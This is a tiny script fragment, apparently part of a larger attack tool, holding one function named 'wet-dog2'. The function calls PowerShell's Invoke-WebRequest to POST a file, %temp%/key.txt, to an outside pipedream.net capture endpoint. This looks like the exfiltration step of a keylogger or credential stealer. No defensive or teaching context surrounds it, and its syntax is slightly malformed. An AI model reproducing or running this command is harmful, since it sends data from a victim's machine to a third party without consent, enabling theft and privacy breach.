function wet-dog2 {
  \npowershell Invoke-WebRequest -Url https://en0501ny223ikh.x.pipedream.net/ -Method POST -ContentType 'text/plain'-InFile '%temp%/key.txt'
}
